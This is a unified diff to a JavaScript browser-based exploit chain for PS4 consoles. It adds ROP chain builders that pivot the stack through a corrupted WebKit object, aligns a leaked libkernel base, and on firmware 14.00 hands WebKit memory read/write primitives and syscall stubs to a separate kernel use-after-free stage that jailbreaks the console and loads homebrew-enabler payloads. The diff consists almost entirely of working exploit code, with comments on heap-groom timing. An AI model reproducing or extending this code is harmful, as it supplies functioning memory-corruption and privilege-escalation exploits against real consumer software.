@@ -53,30 +53,41 @@ function finishUI(ok) {
   if (SHOW_LOG || !document.body) return;
   document.body.className = ok ? "done" : "fail";
 }
+/* mark() posts every line with an XMLHttpRequest, which on this console is
+   the right thing for a chain that makes a few hundred of them and the wrong
+   thing for a kernel stage that writes one line per step inside a heap
+   groom: the request is a syscall, an allocation and a scheduling point, and
+   afterglow's free-to-refill window is measured in microseconds. So it gets
+   the same line, drawn the same way, with no request behind it. */
+function markQuiet(tag, detail) {
+  detail = terse(detail);
+  lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
+  drawLines();
+}
+function drawLines() {
+  if (!(SHOW_LOG && outEl)) return;
+  const esc = (t) => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
+  outEl.innerHTML = lines
+    .map(function (l) {
+      l = esc(l);
+      const c =
+        /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i.test(l)
+          ? "bad"
+          : /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i.test(l)
+            ? "warn"
+            : /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED/i.test(l)
+              ? "ok"
+              : "";
+      return c ? '<span class="' + c + '">' + l + "</span>" : l;
+    })
+    .join("\n");
+  outEl.scrollTop = outEl.scrollHeight;
+}
 function mark(tag, detail) {
   const raw = detail;
   detail = terse(detail);
   lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
-  if (SHOW_LOG && outEl) {
-    const esc = (t) => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
-    outEl.innerHTML = lines
-      .map(function (l) {
-        l = esc(l);
-        const c =
-          /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i.test(
-            l,
-          )
-            ? "bad"
-            : /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i.test(l)
-              ? "warn"
-              : /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED/i.test(l)
-                ? "ok"
-                : "";
-        return c ? '<span class="' + c + '">' + l + "</span>" : l;
-      })
-      .join("\n");
-    outEl.scrollTop = outEl.scrollHeight;
-  }
+  drawLines();
   post(tag, raw);
 }
 
@@ -152,6 +163,12 @@ let allDone = false,
     }
     const fwKey = key || "unknown";
 
+    /* 14.00 is the one row that carries no kernel RVAs. The aio/lapse chain
+       this file drives stops at 13.52; above it the kernel stage belongs to
+       afterglow (js/afterglow.js). `own_kernel_stage` marks that row, and
+       everything up to the ROP call is the same work either way. */
+    const ownKernelStage = off.own_kernel_stage === true;
+
     const DO_JB = params.get("jb") !== "0";
     const DO_PATCH = params.get("patch") !== "0";
     const DO_PAYLOAD = params.get("payload") !== "0";
@@ -174,7 +191,7 @@ let allDone = false,
     if (
       !check(
         "kernel-table-present",
-        missing.length === 0,
+        missing.length === 0 || ownKernelStage,
         "fw=" +
           fwKey +
           " missing=[" +
@@ -186,16 +203,23 @@ let allDone = false,
     )
       return;
 
-    const KPATCH_FILE =
-      "bin/patches/" + (off.kpatch || fwKey.replace(".", "") + ".bin");
-    const PAYLOAD_FILE = off.payload || "payload.bin";
+    /* On a row with its own kernel stage these two are only what the log
+       prints: that stage carries its own patch set and picks its enabler from
+       ?payload, so nothing here is fetched. The paths named are the ones it
+       actually uses, so the log does not lie. */
+    const KPATCH_FILE = ownKernelStage
+      ? "bin/patches/1400.bin (afterglow)"
+      : "bin/patches/" + (off.kpatch || fwKey.replace(".", "") + ".bin");
+    const PAYLOAD_FILE = ownKernelStage
+      ? "bin/goldhen1400.bin|bin/hen1400.bin (per payload)"
+      : off.payload || "payload.bin";
     const needPatch = ["k_sysent_661", "k_jmp_rsi"].filter(
       (k) => off[k] === undefined,
     );
     if (
       !check(
         "kpatch-table-present",
-        !DO_PATCH || needPatch.length === 0,
+        !DO_PATCH || needPatch.length === 0 || ownKernelStage,
         "missing=[" +
           needPatch.join(",") +
           "] blob=" +
@@ -210,26 +234,37 @@ let allDone = false,
     if (
       !check(
         "payload-table-present",
-        !DO_PAYLOAD || needPl.length === 0,
+        !DO_PAYLOAD || needPl.length === 0 || ownKernelStage,
         "missing=[" + needPl.join(",") + "] payload=" + PAYLOAD_FILE,
       )
     )
       return;
     mark("FW-STATUS", off.fw_status || "none");
-    mark(
-      "FW-KTABLE",
-      "idt_rsvd=0x" +
-        off.k_idt_rsvd.toString(16) +
-        " prison0=0x" +
-        off.k_prison0.toString(16) +
-        " rootvnode=0x" +
-        off.k_rootvnode.toString(16) +
-        " kpatch=" +
-        KPATCH_FILE +
-        " payload=" +
-        PAYLOAD_FILE +
-        " src=ps4_offsets.js",
-    );
+    if (!ownKernelStage)
+      mark(
+        "FW-KTABLE",
+        "idt_rsvd=0x" +
+          off.k_idt_rsvd.toString(16) +
+          " prison0=0x" +
+          off.k_prison0.toString(16) +
+          " rootvnode=0x" +
+          off.k_rootvnode.toString(16) +
+          " kpatch=" +
+          KPATCH_FILE +
+          " payload=" +
+          PAYLOAD_FILE +
+          " src=ps4_offsets.js",
+      );
+    else
+      mark(
+        "FW-KTABLE",
+        "kernel stage=afterglow (own leak, own patch set, own enablers)" +
+          " kpatch=" +
+          KPATCH_FILE +
+          " payload=" +
+          PAYLOAD_FILE +
+          " src=ps4_offsets.js",
+      );
 
     // ---- benign-miss auto-retry (reads only, before any kernel write) ----
     // A passA/passB "no crossing" is a recoverable reclaim miss in the READ
@@ -323,7 +358,23 @@ let allDone = false,
     );
     const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
     const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
-    const libkernelBase = errorFn.sub32(off.k__error);
+    let libkernelBase = errorFn.sub32(off.k__error);
+
+    /* libkernel is a module base and lands on the 16 KiB grid; the table's
+       k__error is measured inside it, so the subtraction should already be
+       aligned. On a row with its own kernel stage afterglow does not trust
+       the measurement it does not have and pins the page instead of stopping
+       -- its host does the same on 14.00, where libkernel moved and the
+       WebKit side did not. Only that row: for every other firmware an
+       unaligned base is a wrong table and must stay a hard stop. */
+    if (ownKernelStage && (libkernelBase.low & 0x3fff) !== 0) {
+      const adjust = libkernelBase.low & 0x3fff;
+      libkernelBase = libkernelBase.sub32(adjust);
+      mark(
+        "LIBKERNEL-ALIGN",
+        "adjust=0x" + adjust.toString(16) + " base=" + libkernelBase,
+      );
+    }
     mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
     const aligned = (v) => v.hi > 0 && (v.low & 0x3fff) === 0;
     if (
@@ -523,12 +574,141 @@ let allDone = false,
         i32: M.frameDv.getUint32(0, true) | 0,
       };
     }
+    /* One entry, several syscalls -- laid out before the entry so that
+       nothing inside it allocates. afterglow's reclaim window is
+       free -> 126 setsockopt -> refill: one entry per call would be 126
+       trips through the pivot where the upstream host pays one, and the
+       window is the only thing standing between a landed free and a console
+       that survives. Same shape as callAddr, chained instead of ended. */
+    function prepareMany(calls) {
+      const c = M,
+        RET = G.POP_RDI_RET.add32(1);
+      const insts = [];
+      for (let k = 0; k < calls.length; ++k) {
+        const args = calls[k][1];
+        for (let i = 0; i < args.length; ++i) {
+          insts.push(argGadget[i]);
+          insts.push(args[i]);
+        }
+        insts.push(calls[k][0]);
+        if ((args.length * 2 + 1) % 2 === 1) insts.push(RET);
+      }
+      insts.push(G.POP_RDI_RET);
+      insts.push(c.F);
+      insts.push(G.MOV_RDI_RAX_RET);
+      insts.push(G.POP_RAX_RET);
+      insts.push(JSVALUE_UNDEFINED);
+      insts.push(G.LEAVE_RET);
+      let at = 0x2000 - 8 * insts.length;
+      if (at < 0x40)
+        throw new Error("prepareMany: " + calls.length + " does not fit");
+      if (((c.K.low + at) & 0xf) !== 0) at -= 8;
+      const bytes = new Uint8Array(8 * insts.length);
+      const bdv = new DataView(bytes.buffer);
+      for (let i = 0; i < insts.length; ++i) put(bdv, 8 * i, insts[i]);
+      keepAlive.push(bytes, bdv);
+      return { bytes: bytes, at: at, sp: c.K.add32(at) };
+    }
+
+    function runPrepared(prep) {
+      const c = M;
+      c.frameU8.fill(0);
+      c.stackU8.set(prep.bytes, prep.at);
+      put(c.pivotDv, off.pivot_view_sp, prep.sp);
+      const saved = p.read8(pivotCell);
+      p.write8(pivotCell, M.S);
+      Math.expm1(pivotObj);
+      p.write8(pivotCell, saved);
+      return {
+        lo: M.frameDv.getUint32(0, true),
+        hi: M.frameDv.getUint32(4, true),
+        i32: M.frameDv.getUint32(0, true) | 0,
+      };
+    }
+
     const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
     closeFd = (fd) => sc(SYS.close, fd).i32;
     function errno() {
       const r = callAddr(errorFn, []);
       const a = new int64(r.lo, r.hi);
       return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
+    }
+
+    /* ---- rows that bring their own kernel stage (14.00) ------------------
+       Everything above -- the WebKit primitive, the two module bases and the
+       syscall stubs -- is all afterglow asks of a host, and all of it is
+       already here. So hand it over at exactly the point where this file
+       would have started reading the kernel, and stop: two exploits must
+       never run against one kernel. The row is the only thing that decides
+       this, so ?payload still means "which enabler" rather than "run the old
+       chain" on this firmware.
+
+       14.00 is not a 14.00-only bug. The apm use-after-free afterglow
+       drives is the same class as the aio one below, so a console that ends
+       up supporting a newer row later needs its own row here, not a switch. */
+    if (ownKernelStage) {
+      mark(
+        "STAGE",
+        "fw=" +
+          fwKey +
+          " kernel stage=afterglow -- the aio chain below stops at 13.52",
+      );
+      state("running the kernel stage...", "warn");
+      let iface = null;
+      try {
+        const ag = await import("./afterglow.js");
+        iface = await ag.runAfterglow({
+          /* the primitive */
+          p: p,
+          keepAlive: keepAlive,
+
+          /* WebKit: syscall-by-number, a buffer's address, errno */
+          stubAddr: stubAddr,
+          callAddr: callAddr,
+          bufAddr: bufAddr,
+          errno: errno,
+          webkitBase: webkitBase,
+          libkernelBase: libkernelBase,
+
+          /* ROP: the same two the spray below uses, so a 126 socket window
+             costs five entries here and not 126 */
+          prepareMany: prepareMany,
+          runPrepared: runPrepared,
+
+          /* what this page already has */
+          params: params,
+          mark: markQuiet,
+          state: state,
+          off: off,
+
+          /* this repo's files: bin/patches/1400.bin and the two enablers */
+          patchSet: "bin/patches/1400.bin",
+          enablers: { goldhen: "bin/goldhen1400.bin", hen: "bin/hen1400.bin" },
+        });
+      } catch (agErr) {
+        mark(
+          "AG-THREW",
+          (agErr && agErr.message) || String(agErr),
+        );
+      }
+      payloadRunning = !!(iface && iface.payload);
+      allDone = true;
+      mark(
+        "AG-VERDICT",
+        "fw=" +
+          fwKey +
+          " kernel=" +
+          (iface ? "open" : "NOT open") +
+          " jailbroken=" +
+          (iface ? 1 : 0) +
+          " payload_running=" +
+          (payloadRunning ? 1 : 0) +
+          " devs_held=" +
+          (iface && iface.devs ? iface.devs.length : 0) +
+          " defused=" +
+          (iface && iface.defused ? 1 : 0),
+      );
+      return;
     }
     const pid = sc(SYS.getpid).i32;
     check(
